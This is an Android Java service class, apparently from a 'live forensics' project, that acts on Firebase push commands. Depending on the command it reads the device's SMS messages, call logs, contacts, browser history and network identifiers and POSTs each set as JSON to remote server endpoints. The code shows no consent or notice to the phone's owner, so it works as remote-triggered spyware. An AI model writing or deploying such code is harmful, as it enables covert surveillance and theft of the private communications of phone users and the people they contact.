package project.service;


import android.annotation.TargetApi;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.Telephony;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

import project.liveforensics.ConstantUtils;
import project.liveforensics.R;
import project.modelClass.CallLogsBean;
import project.modelClass.ContactsBean;
import project.modelClass.DiscoveryBean;
import project.modelClass.HistoryBean;
import project.modelClass.SMSBean;
import project.modelClass.ServerCLBean;
import project.modelClass.ServerDCBean;
import project.modelClass.ServerSMSBean;

import static project.liveforensics.ConstantUtils.BOOKMARKS_URI;
import static project.liveforensics.ConstantUtils.CALLLOGS_URL;
import static project.liveforensics.ConstantUtils.CALL_PROJECTION;
import static project.liveforensics.ConstantUtils.CONTACTS_PROJECTION;
import static project.liveforensics.ConstantUtils.CONTACTS_URL;
import static project.liveforensics.ConstantUtils.DISCOVER_URL;
import static project.liveforensics.ConstantUtils.HISTORY_PROJECTION;
import static project.liveforensics.ConstantUtils.HISTORY_URL;
import static project.liveforensics.ConstantUtils.SMS_PROJECTION_T14;
import static project.liveforensics.ConstantUtils.SMS_PROJECTION_T19;
import static project.liveforensics.ConstantUtils.SMS_URI_T14;
import static project.liveforensics.ConstantUtils.SMS_URL;

public class FCMService extends FirebaseMessagingService {

    private static final String TAG = FCMService.class.getSimpleName();
    private DiscoveryBean discoveryBean;
    private HistoryBean historyBean;
    private ServerCLBean serverCLBean;
    private ServerDCBean serverDCBean;
    private ServerSMSBean serverSMSBean;


    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.e(TAG, "From: " + remoteMessage.getFrom());

        if (remoteMessage == null)
            return;

        if (remoteMessage.getData().size() > 0) {
            Log.e(TAG, "Data Payload: " + remoteMessage.getData().toString());

            try {
                JSONObject json = new JSONObject(remoteMessage.getData().toString());
                handleDataMessage(json);
            } catch (Exception e) {
                Log.e(TAG, "Exception: " + e.getMessage());
            }
        }
    }


    private void handleDataMessage(JSONObject json) {
        Log.e(TAG, "push json: " + json.toString());

        try {
            String userRefId = json.getString("userRefId");
            String flowName = json.getString("flowName");
            String flowDate = json.getString("flowDate");
            int transactionID = json.getInt("transactionID");

            if (flowName.equalsIgnoreCase("Discover")) {

                ConstantUtils cUtils = new ConstantUtils(
                        getApplicationContext());
                String manufacturer = Build.MANUFACTURER;
                String myDeviceModel = android.os.Build.MODEL;
                Field[] fields = Build.VERSION_CODES.class.getFields();
                String fName = null;
                for (Field field : fields) {

                    String fieldName = field.getName();
                    int fieldValue = -1;
                    try {
                        fieldValue = field.getInt(new Object());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (fieldValue == Build.VERSION.SDK_INT) {
                        fName = fieldName;
                    }
                }
                String sysVersion = Build.VERSION.RELEASE;
                String arch = System.getProperty("os.arch");
                String kernel = System.getProperty("os.version");
                long time = Build.TIME;
                String dateText = longToDateString(time);

                String appName = getString(R.string.app_name);
                PackageInfo pInfo = null;
                try {
                    pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }
                String version = pInfo.versionName;
                long installed = pInfo.firstInstallTime;
                String aa = longToDateString(installed);
                java.sql.Date installedSQlDate = java.sql.Date.valueOf(aa);

                String user = Build.USER;
                WifiManager manager1 = (WifiManager) getSystemService(Context.WIFI_SERVICE);
                WifiInfo info = manager1.getConnectionInfo();
                String macAddress = info.getMacAddress();
                String ipv4 = getIPAddress(true);
                String ipv6 = getIPAddress(false);

                java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
//                discoveryBean.setCreatedDate(sqlDate);
//                discoveryBean.setTransactionId(transactionID);
                discoveryBean = new DiscoveryBean(userRefId, "Android", manufacturer + " " + myDeviceModel, fName, sysVersion, arch, kernel, manufacturer + " " + myDeviceModel,
                        dateText, appName, version, appName + " " + user + " " + arch, installedSQlDate, macAddress, ipv4, ipv6, sqlDate, transactionID);
                new Interrogate().execute(cUtils.smartClientID, discoveryBean.toString());

            } else if (flowName.equalsIgnoreCase("BrowserHistory")) {
                ArrayList<JSONObject> historyArray= new ArrayList();
                Cursor mCur = this.getContentResolver()
                        .query(BOOKMARKS_URI, HISTORY_PROJECTION,
                                "bookmark = 0", null, null);
                mCur.moveToFirst();
                String url = "";
                String date = "";

                if (mCur.getCount() > 0) {
                    while (!mCur.isAfterLast()) {
                        url = mCur.getString(mCur.getColumnIndex("url"));
                        date = mCur.getString(mCur.getColumnIndex("date"));
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("url", url.toString());
                        jsonObject.put("date", longToDateString(Long.valueOf(date)));
                        historyArray.add(jsonObject);

                        mCur.moveToNext();
                    }
                }
                mCur.close();
                java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
                historyBean = new HistoryBean(userRefId, historyArray, sqlDate, transactionID);
                Log.d("builder ", historyBean.toString());
                new BrwoserHistory().execute(userRefId, historyBean.toString());
            } else if (flowName.equalsIgnoreCase("CallLogs")) {

                List<CallLogsBean> list = new ArrayList<>();
                Cursor callCur;
                String callSort = CallLog.Calls.DATE + " DESC";

                try {
                    callCur = this.getContentResolver().query(CallLog.Calls.CONTENT_URI, CALL_PROJECTION, null, null, callSort);
                } catch (SecurityException e) {
                    Log.e(TAG, "CallLog Permission Denied");
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Unable to query CallLog");
                    return;
                }

                if (callCur.getCount() > 0) {
                    int id;
                    String name;
                    String number;
                    long duration;
                    Date date;
                    int typeID;
                    String countryISO;

                    while (callCur.moveToNext()) {
                        id = callCur.getInt(callCur.getColumnIndexOrThrow(CallLog.Calls._ID));
                        number = callCur.getString(callCur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        name = callCur.getString(callCur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        duration = callCur.getLong(callCur.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        date = new Date(callCur.getLong(callCur.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        java.sql.Date sqlDate = new java.sql.Date(date.getTime());

                        typeID = callCur.getInt(callCur.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        countryISO = callCur.getString(callCur.getColumnIndexOrThrow(CallLog.Calls.COUNTRY_ISO));

                        String type;
                        if (typeID == CallLog.Calls.INCOMING_TYPE) {
                            type = "Incoming";
                        } else if (typeID == CallLog.Calls.MISSED_TYPE) {
                            type = "Missed";
                        } else {
                            type = "Outgoing";
                        }
                        CallLogsBean callLogsBean = new CallLogsBean(id, name, number, (int) duration, sqlDate, type, countryISO);
                        list.add(callLogsBean);
                    }
                } else {
                    Log.e(TAG, "Unable to query CallLog");
                }
                callCur.close();

                java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
                serverCLBean = new ServerCLBean(userRefId, list, sqlDate, transactionID);
                new CallLogs().execute(userRefId, serverCLBean.toString());
            } else if (flowName.equalsIgnoreCase("DeviceContacts")) {

                List<ContactsBean> list = new ArrayList<>();
                Cursor conCur;
                try {
                    conCur = this.getContentResolver().query(Phone.CONTENT_URI, CONTACTS_PROJECTION, null, null, null)
                    ;
                } catch (Exception e) {
                    Log.e(TAG, "" + e);
                    return;
                }

                if (conCur.getCount() > 0) {
                    int id;
                    String phoneName;
                    String phoneNumber;

                    while (conCur.moveToNext()) {
                        id = conCur.getInt(conCur.getColumnIndexOrThrow(Phone._ID));
                        phoneName = conCur.getString(conCur.getColumnIndexOrThrow(Phone.DISPLAY_NAME));
                        phoneNumber = conCur.getString(conCur.getColumnIndexOrThrow(Phone.NUMBER));
                        ContactsBean contactsBean = new ContactsBean(id, phoneName, phoneNumber);
                        list.add(contactsBean);
                    }
                } else {
                    Log.e(TAG, "Unable to query Contacts");
                }
                conCur.close();

                java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
                serverDCBean = new ServerDCBean(userRefId, list, sqlDate, transactionID);
                new SendToServer().execute(userRefId, serverDCBean.toString(), flowName);
            } else if (flowName.equalsIgnoreCase("ShortMessage")) {
                if (Build.VERSION.SDK_INT >= 19) {
                    targetAPI19(userRefId, flowName, transactionID);
                } else {
                    targetAPI14(userRefId, flowName, transactionID);
                }
            }

        } catch (JSONException e) {
            Log.e(TAG, "Json Exception: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
        }
    }

    @TargetApi(19)
    private void targetAPI19(String userRefId, String flowName, int transID) {
        Cursor smsCur = null;
        try {
            smsCur = this.getContentResolver().query(Telephony.Sms.CONTENT_URI, SMS_PROJECTION_T19, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
        } catch (Exception e) {
            Log.e(TAG, "Cant Query, returning null");
        }
        getSMSContent(userRefId, flowName, smsCur, transID);
    }


    @TargetApi(14)
    private void targetAPI14(String userRefId, String flowName, int transID) {
        Cursor smsCur = null;
        try {
            smsCur = this.getContentResolver().query(SMS_URI_T14, SMS_PROJECTION_T14, null, null, null);
        } catch (Exception e) {
            Log.e(TAG, "Cant Query, returning null");
        }
        getSMSContent(userRefId, flowName, smsCur, transID);
    }

    private void getSMSContent(String userRefId, String flowName, Cursor smsCur, int transID) {
        List<SMSBean> list = new ArrayList<>();
        if (smsCur.getCount() > 0) {
            long smsID;
            String smsAddress;
            Date smsDate;
            int smsType;
            String smsBody;

            while (smsCur.moveToNext()) {
                try {
                    smsID = smsCur.getLong(smsCur.getColumnIndexOrThrow("_id"));
                    smsAddress = smsCur.getString(smsCur.getColumnIndexOrThrow("address"));
                    smsDate = new Date(smsCur.getLong(smsCur.getColumnIndexOrThrow("date")));
                    java.sql.Date sqlSMSDate = new java.sql.Date(smsDate.getTime());
                    smsType = smsCur.getInt(smsCur.getColumnIndexOrThrow("type"));
                    smsBody = smsCur.getString(smsCur.getColumnIndexOrThrow("body"));

                    if (smsID == -1) {
                        Log.e(TAG, "Invalid SMS");
                        return;
                    }
                    String smsAction;
                    switch (smsType) {
                        case 1:
                            smsAction = "Received";
                            break;
                        case 4:
                            smsAction = "Sent";
                            break;
                        case 5:
                            smsAction = "Failed";
                            break;
                        case 6:
                            smsAction = "Queued";
                            break;
                        default:
                            continue;
                    }
                    int iSMSID = (int) smsID;
                    SMSBean smsBean = new SMSBean(iSMSID, smsAddress, sqlSMSDate, smsAction, smsBody);
                    list.add(smsBean);

                } catch (Exception e) {
                    Log.e(TAG, "Unable to retrieve SMS fields");
                    return;
                }
            }
        }
        smsCur.close();
        java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
        serverSMSBean = new ServerSMSBean(userRefId, list, sqlDate, transID);
        new SendToServer().execute(userRefId, serverSMSBean.toString(), flowName);
    }

    private String longToDateString(long time) {
        Date date1 = new Date(time);
        SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd");
        return df2.format(date1);
    }

    private java.sql.Date longToSQLDate(long time) {
        java.sql.Date date1 = new java.sql.Date(time);
        return date1;
    }

    public static String getIPAddress(boolean ipaddr) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        boolean isIPv4 = sAddr.indexOf(':') < 0;

                        if (ipaddr) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%');
                                return delim < 0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
        }
        return "";
    }

    private class Interrogate extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            String ID = strings[0];
            String jsonData = strings[1];
            Log.d("ID", ID + jsonData);
            try {

                URL url = new URL(DISCOVER_URL + ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(15000);
                conn.setConnectTimeout(15000);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type",
                        "application/json");
                conn.setDoInput(true);
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(jsonData);

                writer.flush();
                writer.close();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new
                            InputStreamReader(
                            conn.getInputStream()));
                    StringBuffer sb = new StringBuffer("");
                    String line = "";

                    while ((line = in.readLine()) != null) {
                        sb.append(line);
                        break;
                    }
                    in.close();
                    System.out.println(sb.toString());
                    return sb.toString();
                } else {
                    return new String("false : " + responseCode);
                }
            } catch (Exception e) {
                return new String("Exception: " + e.getMessage());
            }
        }
    }

    private class BrwoserHistory extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            String ID = strings[0];
            String jsonData = strings[1];
            Log.d("ID", ID + jsonData);
            try {

                URL url = new URL(HISTORY_URL + ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(15000);
                conn.setConnectTimeout(15000);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type",
                        "application/json");
                conn.setDoInput(true);
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(jsonData);

                writer.flush();
                writer.close();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("Response Code",""+responseCode);
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new
                            InputStreamReader(
                            conn.getInputStream()));
                    StringBuffer sb = new StringBuffer("");
                    String line = "";

                    while ((line = in.readLine()) != null) {
                        sb.append(line);
                        break;
                    }
                    in.close();
                    System.out.println(sb.toString());
                    return sb.toString();
                } else {
                    return new String("false : " + responseCode);
                }
            } catch (Exception e) {
                return new String("Exception: " + e.getMessage());
            }
        }
    }

    private class CallLogs extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            String ID = strings[0];
            String jsonData = strings[1];
            Log.d("ID", ID + jsonData);
            try {
                URL url = new URL(CALLLOGS_URL + ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(15000);
                conn.setConnectTimeout(15000);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type",
                        "application/json");
                conn.setDoInput(true);
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(jsonData);

                writer.flush();
                writer.close();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("Code", "" + responseCode);
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new
                            InputStreamReader(
                            conn.getInputStream()));
                    StringBuffer sb = new StringBuffer("");
                    String line = "";

                    while ((line = in.readLine()) != null) {
                        sb.append(line);
                        break;
                    }
                    in.close();
                    System.out.println(sb.toString());
                    return sb.toString();
                } else {
                    return new String("false : " + responseCode);
                }
            } catch (Exception e) {
                return new String("Exception: " + e.getMessage());
            }

        }
    }

    private class SendToServer extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            String ID = strings[0];
            String jsonData = strings[1];
            String flowName = strings[2];
            Log.d("JSON", jsonData);
            try {
                URL url = null;
                if (flowName.equalsIgnoreCase("DeviceContacts")) {
                    url = new URL(CONTACTS_URL + ID);
                } else if (flowName.equalsIgnoreCase("ShortMessage")) {
                    url = new URL(SMS_URL + ID);
                }
                System.out.println("URL" + url);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(15000);
                conn.setConnectTimeout(15000);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type",
                        "application/json");
                conn.setDoInput(true);
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(jsonData);

                writer.flush();
                writer.close();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("Code", "" + responseCode);
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new
                            InputStreamReader(
                            conn.getInputStream()));
                    StringBuffer sb = new StringBuffer("");
                    String line = "";

                    while ((line = in.readLine()) != null) {
                        sb.append(line);
                        break;
                    }
                    in.close();
                    System.out.println(sb.toString());
                    return sb.toString();
                } else {
                    return new String("false : " + responseCode);
                }
            } catch (Exception e) {
                return new String("Exception: " + e.getMessage());
            }
        }
    }
}
